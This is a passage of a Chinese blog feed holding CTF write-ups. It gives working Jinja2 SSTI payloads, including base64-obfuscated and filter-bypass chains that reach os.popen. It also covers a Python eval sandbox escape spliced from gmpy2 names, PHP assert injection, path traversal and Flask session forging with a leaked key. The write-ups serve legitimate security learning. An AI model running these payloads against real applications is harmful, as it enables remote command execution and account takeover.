class="line">code=&#123;&#123;url_for.__globals__[&#x27;__buitlins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;&quot;&quot;.__init__.globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">*&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">*&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27; ` echo Y2F0IC9mKg== | base64 -d ` &#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>出现过滤，常用的绕过方法：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><p>绕过{}      %</p><p>绕过.        []</p><p>例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a33d47e40bdd2fe070a2ed06f4713b.png" alt=""></p><h2 id="详解：">详解：</h2><p>SSTI漏洞原理<br>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。</p><p>这么说可能有点抽象，我们看一下下面的python中的基于jinja2的模板渲染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">from jinja2 import *</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">@app.route(&quot;/myan&quot;)</span><br><span class="line"> </span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;,&#x27;guest&#x27;)</span><br><span class="line">    html = &#x27;&#x27;&#x27;&lt;h3&gt; Hello %s&#x27;&#x27;&#x27;%name</span><br><span class="line">    return render_template_string(html)</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">        app.run(debug=True)</span><br></pre></td></tr></table></figure><p>运行后访问http://127.0.0.1:5000/myan可以发现默认的模板解析参数为guest</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d466bfa55bc9ea012079b9bf65a75bb9.png" alt="img"></p><p>从上面的python代码中我们发现服务端的逻辑是接收前端输入的name参数，然后将其返回到后端进行拼接再返回前端进行展示，当我们输入?name=myan时可以发现前端返回结果</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3d9ff35c53bc54aab6e8fc73de499711.png" alt="img"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">模板渲染函数</span><br><span class="line">这里主要有两种模板渲染函数，render_template_string()与render_template()，其中render_template是用来渲染一个指定文件的。render_template_string()则是用来渲染字符串的。而渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123;&#125;&#125;包裹的内容当做变量解析替换。比如&#123;&#123;2*2&#125;&#125;会被解析成4。因此才有了现在的模板注入漏洞。往往变量我们使用&#123;&#123;恶意代码&#125;&#125;。正因为&#123;&#123;&#125;&#125;包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞</span><br></pre></td></tr></table></figure></blockquote><h2 id="SSTI漏洞攻击方法">SSTI漏洞攻击方法</h2><h3 id="继承关系">继承关系</h3><p>这里我想先讲讲类之间的继承关系，因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果，这里我们就具体讲讲类的继承关系</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/12b88699f2f17cdb66c96df653330b03.png" alt="img"></p><p>可以看到我们创建了4个类，其中的B类继承了A类，C、D类继承了B类,如果我们在这创建一个C的对象c，那么我们就可以通过__class__魔术方法来找到它的当前类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/32629cc50bef871c175ff2cb97ba6987.png" alt="img"></p><p>可以看到它返回了一个当前的类为C，我们还可以通过__base__这个魔术方法来找到当前类的父类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2fbe9f85aa0cf607d5d5fcc88271531a.png" alt="img"></p><p>可以看到找到了C类的父类B类，如果还想要找B类的父类可以接着使用__base__魔术方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8c05f226639630b4d4ad107563d1c0c3.png" alt="img"></p><p>是没有类了，但是其实所有的类都时object类的子类，当我们创建一个类而没有显式地指定它继承的父类时，这个类就会默认继承object类，因此我们在添加一个__base__就能拿到object</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7d5077f18454f36e57b3f115a9bd759d.png" alt="img"></p><p>当然这样一个一个递进上去的方法有一些麻烦，所以我们可以使用__mro__魔术方法来一步到位看到类的所有父类</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/46eef7a33066770af3e60cfaac0058f7.png" alt="img"></p><p>由于它是以数组形式的所以我们在后面加上下标就能拿到指定的类了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d5a6a4672f9a1ccbfd8243b789e792ad.png" alt="img"></p><p>或许你看到这里可能感觉没什么用的样子，但是我希望能把这里理解的透彻一些，这样对于后面理解攻击payload会很有帮助</p><p>我们在拿到object类后就可以通过object类来查找python中的所有object类的子类，当然这其中会有我们能通过该类rce的子类。我们通过__subclasses__来获取当前类的所有子类<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/24edbadb9ad62466cff298486ae13f07.png" alt="img"></p><p>可以发现有很多类，前面我们也说到了python的所有类最终都是继承object类的，因此这里存在大量的类，当然我们最终的目的是要去进行rce，因此我们应该寻找与之相关的类，这里就给出一个类&lt;class ‘os._wrap_close’&gt;，我们在这里找一下，一般大概在第139个，不过具体的环境还是要具体分析，比如我这里就是138<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/32322115743a0c2c9e1bd8bb1030689c.png" alt="img"></p><p>跟前面的__mro__魔术方法一样是用数组表示的，可以用下标找到对应的类。接下来我们给这个类进行一些初始化方法</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a1580dabda5d7e8c5650908f99c21b90.png" alt="img"></p><p>初始化方法后可以通过__globals__魔术方法来返回当前类方法中的全局变量字典，可能有一点点抽象，我也不太懂具体是返回什么，但是大致就是返回当前类的全局变量</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a57a84281c102d35a1952386499a3bd4.png" alt="img"></p><p>可以发现很多全局变量都在里面，我们需要最后能够进行rce，因此应该找到能执行系统命令的方法，这里用popen函数来执行系统命令，在后面加上具体的函数名即可找到对应的函数</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1349cff6c89f458812eff436f68c7b41.png" alt="img"></p><p>我们执行一下shell命令，这里执行一下whoami，这里一定要记得用.read()来读取一下，因为popen方法返回的是一个与子进程通信的对象，为了从该对象中获取子进程的输出，因此需要使用read()方法来读取子进程的输出】。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5c13d7c7df91b9d0be15f9e52b194454.png" alt="img"></p><p>可以发现成功执行系统命令，这里我们就其实通过类的继承关系里大致讲完了SSTI的一个攻击的思路。</p><h3 id="魔术方法">魔术方法</h3><p>上面用的魔术方法这里总结一下，其他更多的魔术方法之后在补充一下</p><p><strong>class</strong>   ：返回类型所属的对象<br><strong>mro</strong>     ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><strong>base</strong>   ：返回该对象所继承的父类<br><strong>mro</strong>     ：返回该对象的所有父类</p><p><strong>subclasses</strong>()  获取当前类的所有子类<br><strong>init</strong>  类的初始化方法<br><strong>globals</strong>  对包含(保存)函数全局变量的字典的引用</p><p>我们可以直接使用下面这些来直接获取对应的类</p><blockquote><p>‘’.<strong>class</strong></p><p>().<strong>class</strong></p><p>[].<strong>class</strong></p><p>“”.<strong>class</strong></p><p>{}.<strong>class</strong></p></blockquote><p>长度限制绕过：</p><p>1.使用较短的注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br><span class="line"> </span><br><span class="line">*&#123;&#123;lipsum.__globals__.os.popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>2.使用全局变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set x=config.update(a=config.update)%&#125;</span><br><span class="line">&#123;%set x=config.a(f=lipsum.__globals__)%&#125;</span><br><span class="line">&#123;%set x=config.a(o=config.f.os)%&#125;</span><br><span class="line">&#123;%set x=config.a(p=config.o.popen)%&#125;</span><br><span class="line">&#123;&#123;config.p(&quot;ls&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.8.6</title>
      <link href="/posts/fc812fba.html"/>
      <url>/posts/fc812fba.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="算力超群">算力超群</h2><p>考点：抓包，eval()函数利用，漏洞利用</p><p>打开发现是个计算器。一般碰到计算器就很容易和命令执行扯到一块。<br>随便计算下然后抓个包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806180720171.png" alt="image-20240806180720171"></p><p>发现是get方法，改参数让它报错。发现eval()函数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806180956097.png" alt="image-20240806180956097"></p><p>python语言，用危险函数<code>eval()</code>进行运算。这里我们使用沙箱逃逸，执行命令反弹shell。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_calculate?number1=&amp;operator=&amp;number2=__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806181354332.png" alt="image-20240806181354332"></p><h2 id="算力升级">算力升级</h2><p>考点：python库，拼接绕过，漏洞利用</p><p>打开，查看源码。</p><p>code是输入框提交的内容，下面这段代码是将code中由字母、数字、下划线组成的字符串取出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pattern=re.compile(r&#x27;\w+&#x27;)</span><br><span class="line">for item in pattern.findall(code):</span><br></pre></td></tr></table></figure><p>如果取出的不是数字就判断是否为gmpy2库(高精度算术运算库)的函数名，如果最后都是就eval(code)代码执行</p><p>那么我们可以看一下gmpy2库的函数有什么是可以利用的</p><p>先在本地安装gmpy2库，pip install gmpy2</p><p>查看所有函数名，结果有很多，不过没有可以直接利用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">print(dir(gmpy2))</span><br></pre></td></tr></table></figure><p>里面有gmpy2和__builtins__，看看gmpy2.__builtins__支持哪些函数，发现有eval</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806184033715.png" alt="image-20240806184033715"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240806184054698.png" alt="image-20240806184054698"></p><p>那么我们就可以通过对gmpy2库中的函数名中的字母进行拼接，来等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;eval&#x27;](&quot;os.popen(&#x27;cat /flag&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure><p>这里可以直接用os是因为import os了，如果没有可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;erf&#x27;[0]+&#x27;div&#x27;[2]+&#x27;ai&#x27;[0]+&#x27;lcm&#x27;[0]](&#x27;cos&#x27;[1]+&#x27;cos&#x27;[2]+&quot;.&quot;+&#x27;cmp&#x27;[2]+&#x27;cos&#x27;[1]+&#x27;cmp&#x27;[2]+&#x27;erf&#x27;[0]+&#x27;jn&#x27;[1]+&quot;(&quot;+&quot;&#x27;&quot;+&#x27;cmp&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;cot&#x27;[2]+&quot; &quot;+&quot;/&quot;+&#x27;erf&#x27;[2]+&#x27;lcm&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;agm&#x27;[1]+&quot;&#x27;&quot;+&quot;)&quot;+&quot;.&quot;+&#x27;erf&#x27;[1]+&#x27;erf&#x27;[0]+&#x27;ai&#x27;[0]+&#x27;add&#x27;[1]+&quot;(&quot;+&quot;)&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.29</title>
      <link href="/posts/9a40696a.html"/>
      <url>/posts/9a40696a.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="化零为整">化零为整</h2><p>考点：代码审计，url编码</p><p>打开网站，分析代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729172402714.png" alt="image-20240729172402714"></p><p>其中就是把“大牛”二字用url编码后，分别传参就行。</p><h2 id="传说之下（雾）">传说之下（雾）</h2><p>考点：控制台运行</p><p>打开链接，是一个贪吃蛇游戏，根据提示，要得到2077分才能出现flag。</p><p>调试器查看文件，发现本地变量是Game。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729175716678.png" alt="image-20240729175716678"></p><p>在控制台输入Game，查看发现其中有个score变量，应该是存储分数的。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729175844065.png" alt="image-20240729175844065"></p><p>输入Game.score=2077，然后开始游戏得一分即可出现flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240729175959031.png" alt="image-20240729175959031"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask中的session伪造</title>
      <link href="/posts/320a5814.html"/>
      <url>/posts/320a5814.html</url>
      
        <content type="html"><![CDATA[<p>flask中的session伪造<br>使用 密钥SECRET_KEY 和 经过解码原session篡改后的字典 可以重新加密生成一个session。<br>有一个开源脚本可以帮我们自动生成：<a href="https://github.com/noraj/flask-session-cookie-manager%EF%BC%88kali%E6%9C%BA%E4%B8%8A%E5%B7%B2%E4%B8%8B%E8%BD%BD%EF%BC%89">https://github.com/noraj/flask-session-cookie-manager（kali机上已下载）</a></p><p>现在流行两种方式登录认证方式：Session和JWT，无论是哪种方式其原理都是保存凭证：<br>1.前端发起登录认证请求<br>2.后端登录验证通过，返回给前端一个凭证<br>3.前端发起新的请求时携带凭证<br>只不过session的重点是会在服务端存储凭证；而JWT不会在服务端存储凭证，而是会将返回的凭证根据签名和加密方式来校验其是否被篡改。</p><p>session安全问题：<br>flask框架的session是存储在客户端的，那么就需要解决session是否会被恶意纂改的问题，而flask通过一个secret_key，也就是密钥对数据进行签名来<br>防止session被纂改，在我上面写的例子就定义有密钥（app.config[‘SECRET_KEY’] = ‘tanji_is_A_boy_Yooooooooooooooooooooo!’）</p><p>flask session 伪造：<br>一、session的作用<br>由于http协议是一个无状态的协议，也就是说同一个用户第一次请求和第二次请求是完全没有关系的，但是现在的网站基本上有登录使用的功能，这就要<br>求必须实现有状态，而session机制实现的就是这个功能。用户第一次请求后，将产生的状态信息保存在session中，这时可以把session当做一个容器，它<br>保存了正在使用的所有用户的状态信息；这段状态信息分配了一个唯一的标识符用来标识用户的身份，将其保存在响应对象的cookie中；当第二次请求时，<br>解析cookie中的标识符，拿到标识符后去session找到对应的用户的信息</p><p>二、flask session的储存方式<br>第一种方式：直接存在客户端的cookies中</p><p>第二种方式：存储在服务端，如：redis,memcached,mysql，file,mongodb等等，存在flask-session第三方库</p><p>flask的session可以保存在客户端的cookie中，那么就会产生一定的安全问题。</p><p>三、flask的session格式<br>flask的session格式一般是由base64加密的Session数据(经过了json、zlib压缩处理的字符串) . 时间戳 . 签名组成的。</p><p>eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y48ncA.H99Th2w4FzzphEX8qAeiSPuUF_0<br>session数据                                          时间戳                       签名<br>时间戳：用来告诉服务端数据最后一次更新的时间，超过31天的会话，将会过期，变为无效会话；</p><p>签名：是利用Hmac算法，将session数据和时间戳加上secret_key加密而成的，用来保证数据没有被修改。</p><p>四、flask session伪造<br>上面我们说到flask session是利用hmac算法将session数据，时间戳加上secert_key成的，那么我们要进行session伪造就要先得到secret_key，当我们<br>得到secret_key我们就可以很轻松的进行session伪造。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.26</title>
      <link href="/posts/aff74fb.html"/>
      <url>/posts/aff74fb.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一言既出（笔记KEY：intval绕过）">一言既出（笔记KEY：intval绕过）</h2><p>考点：弱类型比较，intval()函数，注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">include &quot;flag.php&quot;;  </span><br><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    if ($_GET[&#x27;num&#x27;] == 114514)&#123;</span><br><span class="line">        assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>分析代码，传入num，要使num的值等于114514，经过intval()函数后要等于1919810。因此有两种思路：</p><p>1.让num的值同时满足这两个条件。比如可以构造num=114514+1919810-114514，传入时进行url编码。</p><p>由于是弱类型比较，提取开头数字就等于114514，满足条件1，而经过intval()函数处理，最后就是intval(1919810)==1919810，而不会执行die()；</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726142255179.png" alt="image-20240726142255179"></p><p>2.让intval()函数后面的直接不执行（注释掉）。传入num=114514);//。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726142935055.png" alt="image-20240726142935055"></p><p>语句在执行的过程中变为：</p><p>assert(“intval(114514);//)==1919810”) or die(“一言既出，驷马难追!”);</p><p>部分被注释，不在运行，此时执行 echo $flag;</p><h2 id="webshell（经验：空白页面查看页面源代码）">webshell（经验：空白页面查看页面源代码）</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726155020343.png" alt="image-20240726155020343"></p><p>分析，大致就是执行cmd语句，但会对cmd语句进行反序列化，使用传入的cmd要进行序列化</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726155216131.png" alt="image-20240726155216131"></p><p>发现flag.php，再次修改，因为过滤了flag字母，使用tac f*打开。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726153456861.png" alt="image-20240726153456861"></p><p>找到flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240726155419560.png" alt="image-20240726155419560"></p><p>批注：使用cat f*也可以，但是回显是空白，需要查看页面源代码。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.25</title>
      <link href="/posts/93f62541.html"/>
      <url>/posts/93f62541.html</url>
      
        <content type="html"><![CDATA[<h2 id="我吐了你随意">我吐了你随意</h2><p>0宽隐写，使用在线工具，将文本复制进去直接得到flag</p><h2 id="迅疾响应">迅疾响应</h2><p>二维码，先用toolfxs里的工具，发现扫不出来，然后用qrazybox在线工具解出。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112855565.png" alt="image-20240725112855565"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112922997.png" alt="image-20240725112922997"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725112946131.png" alt="image-20240725112946131"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113009662.png" alt="image-20240725113009662"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725113030144.png" alt="image-20240725113030144"></p><h2 id="打不开的图片">打不开的图片</h2><p>图片损坏，扔进010editor看看。发现png格式前缀不对，用工具里的求反，然后保存，图片就恢复正常了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.25</title>
      <link href="/posts/93f62541.html"/>
      <url>/posts/93f62541.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web签到">web签到</h2><p>考点：代码审计，http请求</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725125048233.png" alt="image-20240725125048233"></p><p>先传Cookie,即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTFshow-QQ%E7%BE%A4:=a </span><br></pre></td></tr></table></figure><p>​       (中文要进行url编码)</p><p>接下来传post[‘a’]，即a=b</p><p>然后传get[‘b’]，即?b=c</p><p>最后的request，传GET或者POST方法都可以，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;c[6][0][7][5][8][0][9][4][4]=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725125819297.png" alt="image-20240725125819297"></p><h2 id="web2-c0me-t0-s1gn">web2 c0me_t0_s1gn</h2><p>考点：查看源代码，使用控制台</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725133817711.png" alt="image-20240725133817711"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725133847780.png" alt="image-20240725133847780"></p><h2 id="我的眼里只有￥">我的眼里只有￥</h2><p>考点：代码审计，脚本利用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725192622896.png" alt="image-20240725192622896"></p><p>_=a,即$__=a,后面就是$a，$a=b,就变成$b，以此类推，用python脚本连续传参可解。</p><h2 id="抽老婆">抽老婆</h2><p>考点：查看源代码，代码审计，flask中的session构造</p><p>打开链接，发现可以下载“老婆“。查看代码，发现一串下载的可以代码。（/download?file=a）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220105916.png" alt="image-20240725220105916"></p><p>用GET方法下载一个文件，发现不成功，页面跳转。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220228045.png" alt="image-20240725220228045"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220311186.png" alt="image-20240725220311186"></p><p>发现”flag“，怀疑/app/app.py文件。下载此文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220413846.png" alt="image-20240725220413846"></p><p>报错，仔细分析，发现可以用…/退级，改为 …/…/app.py，成功下载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># !/usr/bin/env python</span><br><span class="line"># -*-coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># File       : app.py</span><br><span class="line"># Time       ：2022/11/07 09:16</span><br><span class="line"># Author     ：g4_simon</span><br><span class="line"># version    ：python 3.9.7</span><br><span class="line"># Description：抽老婆，哇偶~</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from flask import * # type: ignore</span><br><span class="line">import os</span><br><span class="line">import random</span><br><span class="line">from flag import flag</span><br><span class="line"></span><br><span class="line">#初始化全局变量</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = &#x27;tanji_is_A_boy_Yooooooooooooooooooooo!&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():  </span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/getwifi&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def getwifi():</span><br><span class="line">    session[&#x27;isadmin&#x27;]=False</span><br><span class="line">    wifi=random.choice(os.listdir(&#x27;static/img&#x27;))</span><br><span class="line">    session[&#x27;current_wifi&#x27;]=wifi</span><br><span class="line">    return render_template(&#x27;getwifi.html&#x27;,wifi=wifi)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/download&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def source(): </span><br><span class="line">    filename=request.args.get(&#x27;file&#x27;)</span><br><span class="line">    if &#x27;flag&#x27; in filename:</span><br><span class="line">        return jsonify(&#123;&quot;msg&quot;:&quot;你想干什么？&quot;&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return send_file(&#x27;static/img/&#x27;+filename,as_attachment=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/secret_path_U_never_know&#x27;,methods=[&#x27;GET&#x27;])</span><br><span class="line">def getflag():</span><br><span class="line">    if session[&#x27;isadmin&#x27;]:</span><br><span class="line">        return jsonify(&#123;&quot;msg&quot;:flag&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return jsonify(&#123;&quot;msg&quot;:&quot;你怎么知道这个路径的？不过还好我有身份验证&quot;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析发现，它会根据不同/而调用不同的函数，我们需要使用getflag()函数，输入/secret_path_U_never_know。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725220748150.png" alt="image-20240725220748150"></p><p>不行，还要使session[‘isadmin’]为真。（笔记关键词：session）</p><p>用kali机上的flask_session_cookie_manager，先将原session解码，再将isadmin改为True，再编码，替换原session，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240725221139596.png" 